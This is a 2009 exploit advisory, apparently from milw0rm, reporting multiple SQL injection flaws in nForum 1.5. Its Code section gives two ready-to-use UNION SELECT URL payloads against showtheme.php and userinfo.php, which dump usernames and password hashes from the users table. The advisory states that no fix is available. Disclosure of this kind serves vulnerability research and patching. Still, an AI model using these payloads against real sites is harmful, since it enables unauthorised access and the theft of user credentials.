@@ -1,0 +1,61 @@
+*******   Salvatore "drosophila" Fresta   *******
+
+[+] Application: nForum
+[+] Version: 1.5
+[+] Website: http://sourceforge.net/projects/nforum/
+
+[+] Bugs: [A] Multiple SQL Injection
+
+[+] Exploitation: Remote
+[+] Date: 06 Mar 2009
+
+[+] Discovered by: Salvatore "drosophila" Fresta
+[+] Author: Salvatore "drosophila" Fresta
+[+] Contact: e-mail: drosophilaxxx@gmail.com
+
+
+*************************************************
+
+[+] Menu
+
+1) Bugs
+2) Code
+3) Fix
+
+
+*************************************************
+
+[+] Bugs
+
+
+- [A] Multiple SQL Injection
+
+[-] Requisites: magic_quotes_gpc = off
+[-] File affected: showtheme.php, userinfo.php
+
+These bugs allows a guest to view username and 
+the password of a registered user.
+
+
+*************************************************
+
+[+] Code
+
+
+- [A] Multiple SQL Injection
+
+http://www.site.com/path/showtheme.php?id=-1' UNION ALL SELECT 1,2,CONCAT(name, 0x3a, passwd_hash),NULL,5,6,7 FROM users%23
+
+http://www.site.com/path/userinfo.php?user=-1' UNION ALL SELECT 1,2,3,4,5,6,7,8,CONCAT(name, 0x3a, passwd_hash),10,11,12 FROM users%23
+
+
+*************************************************
+
+[+] Fix
+
+No fix.
+
+
+*************************************************
+
+# milw0rm.com [2009-03-09]
